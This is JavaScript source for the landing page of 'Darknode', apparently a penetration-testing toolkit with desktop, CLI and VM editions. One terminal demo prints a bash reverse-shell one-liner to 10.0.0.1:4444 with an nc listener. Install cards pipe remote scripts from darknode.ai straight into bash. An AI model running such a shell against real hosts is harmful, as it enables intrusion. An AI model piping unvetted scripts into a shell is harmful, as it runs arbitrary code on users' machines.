// Marketing landing page shown to signed-out visitors.
// actions: { onGetStarted, onSignIn }

// Installers are hosted on GitHub Releases (too large to commit to the repo).
const REL = "https://github.com/SpartanKing18/darknode-web/releases/download/darknode";
const APP_FILES = {
  linux: REL + "/darknode-app_2.40.0_amd64.deb",
  appimage: REL + "/Darknode-2.40.0.AppImage",
  windows: REL + "/Darknode.Setup.2.29.0.exe",
  macos: REL + "/Darknode-2.40.0-arm64.dmg",
  macos_intel: REL + "/Darknode-2.40.0.dmg",
};
// Darknode OS VM editions: [name, size, description, build command]
const OS_EDITIONS = [
  ["netinstall", "~12 GB", "Just a terminal — no desktop. Core CLI security stack + Nexus AI + local models. Boots to a console. Smallest.", "./build.sh debian netinstall &amp;&amp; ./launch.sh netinstall"],
  ["slim", "~20 GB", "Full XFCE desktop + Nexus + the CLI toolset — minus Metasploit, SecLists, Docker and the cockpit app.", "./build.sh debian slim &amp;&amp; ./export-vbox.sh slim"],
  ["full", "~30 GB", "The complete workstation: desktop, cockpit app, Metasploit, SecLists, Exploit-DB, Docker — 80+ tools.", "./build.sh debian full &amp;&amp; ./export-vbox.sh full"],
];
const SITE = "https://darknode.ai";
const EDITIONS = [
  ["Netinstall", "lightest · ~95 MB", "Just the app. Every tool auto-configures itself the first time you launch it — nothing pre-downloaded.", "Install the app above — done."],
  ["Slim", "recommended", "The app plus the essential toolset: recon, web, and password tools.", "curl -sL " + SITE + "/arsenal.sh | bash -s -- recon web passwords"],
  ["Full", "everything + AI", "The app, the complete arsenal (all 10 categories), and local AI models.", "curl -sL " + SITE + "/arsenal.sh | bash"],
];
const edCardL = (e) => `<div class="ed-card"><div class="ed-head"><h3>${e[0]}</h3><span class="chip">${e[1]}</span></div><p class="muted" style="font-size:.83rem;margin:6px 0 10px">${e[2]}</p>${/curl|sudo|bash/.test(e[3]) ? `<code class="ed-cmd">${e[3]}</code>` : `<div class="muted" style="font-size:.8rem">${e[3]}</div>`}</div>`;

const ICON = {
  tools: '<path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>',
  ai: '<rect x="6" y="6" width="12" height="12" rx="2"/><path d="M9 2v3M15 2v3M9 19v3M15 19v3M2 9h3M2 15h3M19 9h3M19 15h3"/>',
  shield: '<path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6z"/>',
  book: '<path d="M4 5a2 2 0 0 1 2-2h13v16H6a2 2 0 0 0-2 2z"/><path d="M19 3v18"/>',
  terminal: '<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
  bolt: '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
  code: '<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>',
  globe: '<circle cx="12" cy="12" r="9"/><line x1="3" y1="12" x2="21" y2="12"/><path d="M12 3a15 15 0 0 1 0 18 15 15 0 0 1 0-18z"/>',
};
const svg = (k) => `<svg class="ico" viewBox="0 0 24 24">${ICON[k]}</svg>`;
const TOOLS_MARQUEE = ["nmap", "sqlmap", "ffuf", "nuclei", "metasploit", "hydra", "gobuster", "wireshark", "john", "hashcat", "burp", "theHarvester", "subfinder", "wpscan"];

export function renderLanding(view, actions) {
  const feature = (icon, t, d) => `<div class="feat-card"><div class="feat-ico">${svg(icon)}</div><h3>${t}</h3><p>${d}</p></div>`;
  const step = (n, t, d) => `<div class="step"><div class="step-n">${n}</div><div><h3>${t}</h3><p>${d}</p></div></div>`;
  const mod = (icon, t, d) => `<div class="mod-card"><div class="mod-ico">${svg(icon)}</div><div><div class="mod-t">${t}</div><div class="mod-d">${d}</div></div></div>`;
  const demoTerm = (title, body) => `<div class="term-window demo-term"><div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">${title}</span></div><pre class="tw-body">${body}</pre></div>`;
  const P = '<span class="c-pl">darknode@ai</span>:<span class="c-path">~</span>$ ';
  const DEMOS = [
    ["darknode — scan", `${P}darknode scan 10.10.14.7
<span class="c-mut">PORT   SERVICE   BANNER</span>
<span class="c-ok">22</span>     ssh       OpenSSH 9.6p1
<span class="c-ok">80</span>     http      nginx 1.24.0
<span class="c-ok">443</span>    https
<span class="c-acc">[+]</span> 3 open ports found`],
    ["darknode — recon", `${P}darknode dns github.com
A     140.82.112.3
MX    <span class="c-mut">aspmx.l.google.com</span>
NS    dns1.p08.nsone.net
TXT   v=spf1 include:_spf.google.com ~all`],
    ["darknode — cve", `${P}darknode cve log4j
<span class="c-acc">CVE-2021-44228</span> <span class="c-bad">[CRITICAL 10.0]</span>
Apache Log4j2 JNDI features do not
protect against attacker-controlled
LDAP &mdash; the Log4Shell RCE.`],
    ["darknode — payload", `${P}darknode revshell bash 10.0.0.1 4444
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
<span class="c-mut"># catch it with:</span>
nc -lvnp 4444`],
  ];
  const osCard = (name, fmt, os, cmd, note) => `
    <div class="dlapp-item">
      <a class="dlapp-card" href="${APP_FILES[os]}" download><div class="dlapp-os">${name}</div><div class="dlapp-fmt">${fmt}</div></a>
      <div class="dlapp-cmd"><span class="dlapp-cmd-l">After download</span><code>${cmd}</code></div>
      ${note ? `<p class="dlapp-note">${note}</p>` : ""}
    </div>`;

  view.innerHTML = `
    <section class="hero">
      <div class="hero-grid-bg"></div>
      <div class="wrap hero-inner">
        <div class="hero-copy">
          <div class="eyebrow"><span class="dot-live"></span> SECURITY CONSOLE</div>
          <h1 class="hero-h1">Your entire <span class="grad-text">security toolkit</span>, in one console.</h1>
          <p class="hero-sub">Recon, exploitation, threat intel, cheat sheets, and a private local-AI agent &mdash; brought together in one clean workspace across web, desktop, and terminal. Everything you reach for, without the tab sprawl or the setup marathon.</p>
          <div class="hero-cta">
            <button class="btn lg glow" id="cta-start">Get started &mdash; free &rarr;</button>
            <button class="btn ghost lg" id="cta-learn">See what's inside</button>
          </div>
          <div class="hero-trust">
            <span><span class="tk">&#10003;</span> Free to start</span>
            <span><span class="tk">&#10003;</span> Runs on your machine</span>
            <span><span class="tk">&#10003;</span> Your data never leaves your box</span>
          </div>
          <div class="hero-metrics">
            <div class="hm"><div class="hm-n">80+</div><div class="hm-l">tools</div></div>
            <div class="hm"><div class="hm-n">10</div><div class="hm-l">tracked CVEs</div></div>
            <div class="hm"><div class="hm-n">9</div><div class="hm-l">cheat sheets</div></div>
            <div class="hm"><div class="hm-n">3</div><div class="hm-l">platforms</div></div>
          </div>
        </div>
        <div class="hero-visual">
          <div class="term-window">
            <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode — recon</span></div>
            <pre class="tw-body"><span class="tw-line" style="animation-delay:.15s"><span class="c-pl">darknode@ai</span>:<span class="c-path">~</span>$ nmap -sV 10.10.14.7</span><span class="tw-line" style="animation-delay:.6s"><span class="c-mut">Starting Nmap 7.94 · scanning…</span></span><span class="tw-line" style="animation-delay:1s">PORT     STATE SERVICE   VERSION</span><span class="tw-line" style="animation-delay:1.2s">22/tcp   <span class="c-ok">open</span>  ssh       OpenSSH 8.2p1</span><span class="tw-line" style="animation-delay:1.45s">80/tcp   <span class="c-ok">open</span>  http      nginx 1.18.0</span><span class="tw-line" style="animation-delay:1.7s">443/tcp  <span class="c-ok">open</span>  ssl/http  nginx 1.18.0</span><span class="tw-line" style="animation-delay:2s"><span class="c-acc">[+]</span> 3 open ports · 2 services fingerprinted</span><span class="tw-line" style="animation-delay:2.3s"><span class="c-pl">darknode@ai</span>:<span class="c-path">~</span>$ <span class="tw-cursor">▋</span></span></pre>
          </div>
        </div>
      </div>
      <div class="marquee-wrap"><span class="marquee-label">Ships with</span>
        <div class="marquee">${TOOLS_MARQUEE.map((t) => `<span class="mchip">${t}</span>`).join("")}</div>
      </div>
    </section>

    <section class="section" id="features">
      <div class="wrap">
        <div class="eyebrow center">CAPABILITIES</div>
        <h2 class="sec-title">Built to get real work done</h2>
        <div class="feat-grid">
          ${feature("tools", "Curated tooling", "80+ security tools with copy-paste install commands and in-browser utilities &mdash; encoders, hashes, payloads.")}
          ${feature("ai", "Local AI models", "Run Ollama models like llama3.1 and qwen2.5-coder on your own machine &mdash; nothing leaves your box.")}
          ${feature("shield", "Threat intel", "Notable CVEs, a common-ports attack-surface map, and a security-posture checklist.")}
          ${feature("book", "Cheat sheets", "Battle-tested one-liners for recon, shells, privesc, and cracking &mdash; one click to copy.")}
          ${feature("code", "Code workbench", "The desktop app ships a real editor, file tree, run-code, and an integrated terminal.")}
          ${feature("bolt", "Payloads & handlers", "Generate reverse shells, listeners, and msfvenom payloads with live builders.")}
          ${feature("ai", "Autonomous agent", "The desktop app runs your local model in a think-act loop across 26 tools &mdash; files, shell, HTTP, recon, and git &mdash; with approval gating.")}
          ${feature("shield", "Practice labs", "One-click Docker launch for DVWA, Juice Shop, WebGoat and more &mdash; then point Darknode at them, or let the agent stand them up.")}
        </div>
      </div>
    </section>

    <section class="section alt" id="inside">
      <div class="wrap">
        <div class="eyebrow center">WHAT'S INSIDE</div>
        <h2 class="sec-title">One console, every stage of the kill chain</h2>
        <div class="mod-grid">
          ${mod("globe", "Recon & HTTP", "Scanners, subdomain discovery, and a request repeater.")}
          ${mod("terminal", "Live terminal", "Real PTY terminals with tabs in the desktop app.")}
          ${mod("bolt", "Exploitation", "Payload builders, listeners, and exploit references.")}
          ${mod("shield", "Threat intel", "CVE feed, ports reference, and posture tracking.")}
          ${mod("book", "Cheat sheets", "Copy-paste playbooks for every engagement phase.")}
          ${mod("ai", "Local AI", "Chat and code with private, on-device models.")}
        </div>
      </div>
    </section>

    <section class="section" id="demos">
      <div class="wrap">
        <div class="eyebrow center">SEE IT IN ACTION</div>
        <h2 class="sec-title">Point it at a target, get answers</h2>
        <p class="muted dlapp-sub">The same tools run on the web, the desktop app, and the terminal. Here's a taste.</p>
        <div class="demo-grid">${DEMOS.map(([t, b]) => demoTerm(t, b)).join("")}</div>
      </div>
    </section>

    <section class="section" id="how">
      <div class="wrap">
        <div class="eyebrow center">GET STARTED</div>
        <h2 class="sec-title">Up and running in three steps</h2>
        <div class="steps">
          ${step(1, "Create an account", "Sign in with Google, GitHub, or email in seconds.")}
          ${step(2, "Grab your tools", "Pick your OS and copy the exact install commands.")}
          ${step(3, "Work the console", "Recon, exploit, take notes, and jump back anytime.")}
        </div>
      </div>
    </section>

    <section class="section alt" id="who">
      <div class="wrap">
        <div class="eyebrow center">WHO IT'S FOR</div>
        <h2 class="sec-title">Whether you're learning or leading engagements</h2>
        <div class="feat-grid">
          ${feature("book", "Students &amp; learners", "Cheat sheets, guided setup, and legal practice labs &mdash; start from zero and level up.")}
          ${feature("bolt", "Pentesters &amp; red teams", "Recon, payloads, fuzzing, and a code workbench to move fast on real engagements.")}
          ${feature("shield", "Defenders &amp; blue teams", "Track CVEs, audit security headers, and map your own attack surface.")}
          ${feature("code", "Developers", "A private local-AI assistant, code snippets, and a full GitHub workflow built in.")}
        </div>
      </div>
    </section>

    <section class="section" id="get-app">
      <div class="wrap">
        <div class="eyebrow center">DESKTOP APP</div>
        <h2 class="sec-title">Serious power for experienced operators</h2>
        <p class="muted dlapp-sub">Far more capable than the web &mdash; the native app runs tools with a live terminal, a full code workbench, and your local AI, right on your machine.</p>
        <div class="dlapp-grid">
          ${osCard("Linux", ".deb installer", "linux", "sudo apt install ./Darknode-linux.deb", "Debian / Ubuntu / Kali &mdash; recommended. Adds Darknode to your app menu; launch it there or run <code>darknode</code>.")}
          ${osCard("Linux", "AppImage (portable)", "appimage", "chmod +x Darknode-linux.AppImage &amp;&amp; ./Darknode-linux.AppImage", "Any distro (Fedora / Arch / &hellip;). Needs FUSE: <code>sudo apt install libfuse2</code>, or run it with <code>--appimage-extract-and-run</code>.")}
          ${osCard("Windows", ".exe installer", "windows", "Double-click Darknode-windows.exe", "If SmartScreen warns, choose More info &rarr; Run anyway (the installer is unsigned).")}
          ${osCard("macOS", ".dmg &middot; Apple Silicon", "macos", "open the .dmg, drag Darknode to Applications", "Apple Silicon. Intel Mac: <a href=\"" + APP_FILES.macos_intel + "\" download>Intel .dmg</a>. Unsigned &mdash; first launch: right-click &rarr; Open.")}
        </div>

        <div class="dlcli">
          <h3 class="dlcli-h"><span class="mono grad-text">&gt;_</span> Or the whole OS &mdash; Darknode OS security VM</h3>
          <p class="muted dlapp-sub">A self-provisioning Linux workstation &mdash; a Kali / BlackArch alternative. Pick an edition; each boots in VirtualBox or QEMU/KVM and self-configures on first launch.</p>
          <div class="os-editions">
            ${OS_EDITIONS.map((e) => `<div class="os-ed${e[0] === "full" ? " os-ed-full" : ""}">
              <div class="os-ed-h"><b>${e[0]}</b><span class="os-ed-sz">${e[1]}</span>${e[0] === "full" ? '<span class="os-ed-tag">everything</span>' : ""}</div>
              <p class="muted os-ed-d">${e[2]}</p>
              <code class="ed-cmd">${e[3]}</code></div>`).join("")}
          </div>
          <p class="muted" style="font-size:.78rem;margin-top:10px">First <code>git clone https://github.com/SpartanKing18/darknode-os &amp;&amp; cd darknode-os</code>, then run the command. <a href="https://github.com/SpartanKing18/darknode-os" target="_blank" rel="noopener">Darknode OS on GitHub &rarr;</a></p>
        </div>

        <h3 class="dlcli-h" style="margin-top:26px">Pick a setup edition</h3>
        <p class="muted dlapp-sub">Same installer, different amount of tooling. Install the app, then run the command to provision it.</p>
        <div class="ed-grid">${EDITIONS.map(edCardL).join("")}</div>

        <div class="dlcli">
          <h3 class="dlcli-h"><span class="mono grad-text">&gt;_</span> Prefer the terminal? Get the CLI edition</h3>
          <p class="muted dlapp-sub">A single, dependency-free command-line console &mdash; native port scanner, reverse-shell generator, encoders, and cheat sheets. Runs anywhere, even over SSH on a headless box. Two ways to get it:</p>
          <div class="ed-grid">
            <div class="ed-card">
              <div class="ed-head"><h3>git clone</h3><span class="chip">tiny · ~300 KB</span></div>
              <p class="muted" style="font-size:.83rem;margin:6px 0 8px">Clone the source and run it with Node &mdash; no 50&nbsp;MB binary on disk, and <code>git pull</code> keeps it current. Best if you have Node 18+.</p>
              <code class="ed-cmd">git clone https://github.com/SpartanKing18/darknode-cli &amp;&amp; cd darknode-cli &amp;&amp; node darknode.js</code>
            </div>
            <div class="ed-card">
              <div class="ed-head"><h3>Download the binary</h3><span class="chip">standalone · ~52 MB</span></div>
              <p class="muted" style="font-size:.83rem;margin:6px 0 8px">A self-contained executable with Node bundled in &mdash; no Node needed, runs on its own. Uses more disk.</p>
              <code class="ed-cmd">curl -L ${REL}/Darknode-cli-linux -o darknode &amp;&amp; chmod +x darknode &amp;&amp; ./darknode</code>
              <div class="muted" style="font-size:.78rem;margin-top:6px">Windows:<code class="ed-cmd" style="margin-top:4px">curl.exe -L ${REL}/Darknode-cli-windows.exe -o darknode.exe; .\\darknode.exe</code></div>
            </div>
          </div>
          <p class="muted" style="font-size:.78rem;margin-top:10px"><strong>Which?</strong> <b>git clone</b> is smallest and self-updating but needs Node installed. The <b>binary</b> is bigger but works with nothing else installed. Both are the same tool.</p>
        </div>

        <div class="dlcli">
          <h3 class="dlcli-h"><span class="mono grad-text">&gt;_</span> The coding CLI &mdash; meet Nexus</h3>
          <p class="muted dlapp-sub">The same binary is also <b>Nexus</b>, an AI coding agent for your terminal (think Claude Code): it reads and edits your files and runs commands using cloud or free local models &mdash; private, nothing leaves your box. Download it, then run <code>darknode nexus --tui</code>.</p>
          <div class="ed-grid">
            <div class="ed-card">
              <div class="ed-head"><h3>Download &amp; code</h3><span class="chip">standalone · ~52 MB</span></div>
              <p class="muted" style="font-size:.83rem;margin:6px 0 10px">Self-contained binary &mdash; Node bundled in, nothing else to install. Grab it and launch the agent.</p>
              <div class="dlcli-btns">
                <a class="btn" href="${REL}/Darknode-cli-linux" download>Download &middot; Linux</a>
                <a class="btn ghost" href="${REL}/Darknode-cli-windows.exe" download>Download &middot; Windows</a>
              </div>
              <code class="ed-cmd" style="margin-top:8px">darknode nexus --tui</code>
            </div>
            <div class="ed-card">
              <div class="ed-head"><h3>Run from source</h3><span class="chip">tiny · ~300 KB</span></div>
              <p class="muted" style="font-size:.83rem;margin:6px 0 10px">Have Node 18+? Clone and start the coder straight from source &mdash; <code>git pull</code> keeps it current.</p>
              <code class="ed-cmd">git clone https://github.com/SpartanKing18/darknode-cli &amp;&amp; cd darknode-cli &amp;&amp; node darknode.js nexus --tui</code>
            </div>
          </div>
          <p class="muted" style="font-size:.78rem;margin-top:10px">Cloud engines (Claude, GPT, Gemini) or free local models via Ollama &mdash; your choice, switchable per run.</p>
        </div>
      </div>
    </section>

    <section class="cta-band">
      <div class="cta-glow"></div>
      <div class="wrap cta-band-inner">
        <div>
          <h2>Ready to set up your console?</h2>
          <p class="muted">Create your account &mdash; it takes under a minute.</p>
        </div>
        <button class="btn lg glow" id="cta-signup">Sign up free &rarr;</button>
      </div>
    </section>

    <footer class="site-foot">
      <div class="wrap foot-inner">
        <span class="brand">Darknode</span>
        <span class="muted">Your security workspace.</span>
        <span class="foot-owner muted">Owner &middot; <a href="mailto:cashzombs@gmail.com">cashzombs@gmail.com</a></span>
        <nav class="foot-links">
          <a href="#features">Features</a>
          <a href="#inside">Inside</a>
          <a href="#get-app">Download</a>
          <a href="mailto:cashzombs@gmail.com">Contact</a>
          <a id="foot-signin">Sign in</a>
        </nav>
      </div>
      <div class="wrap foot-contact">For any questions, contact <a href="mailto:cashzombs@gmail.com">cashzombs@gmail.com</a></div>
    </footer>`;

  const $ = (id) => view.querySelector("#" + id);
  $("cta-start").onclick = actions.onGetStarted;
  $("cta-signup").onclick = actions.onGetStarted;
  $("cta-learn").onclick = () => document.getElementById("features")?.scrollIntoView({ behavior: "smooth" });
  $("foot-signin").onclick = actions.onSignIn;
  view.addEventListener("click", (e) => { const c = e.target.closest("code.ed-cmd"); if (!c) return; navigator.clipboard?.writeText(c.textContent).then(() => { const o = c.textContent; c.textContent = "copied!"; setTimeout(() => (c.textContent = o), 900); }); });

  // Scroll-reveal: fade sections/cards up as they enter the viewport.
  // Progressive enhancement only — skipped entirely when the browser lacks
  // IntersectionObserver or the visitor prefers reduced motion, so content is
  // always visible by default (the .reveal class is what hides it).
  const reduceMotion = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  if ("IntersectionObserver" in window && !reduceMotion) {
    const targets = view.querySelectorAll(
      "#features .sec-title, #inside .sec-title, #demos .sec-title, #how .sec-title, #who .sec-title, #get-app .sec-title, " +
      ".feat-card, .mod-card, .demo-term, .step, .dlapp-item, .ed-card, .cta-band-inner"
    );
    const io = new IntersectionObserver((entries) => {
      entries.forEach((en) => { if (en.isIntersecting) { en.target.classList.add("in"); io.unobserve(en.target); } });
    }, { rootMargin: "0px 0px -8% 0px", threshold: 0.08 });
    targets.forEach((el) => { el.classList.add("reveal"); io.observe(el); });
  }
}
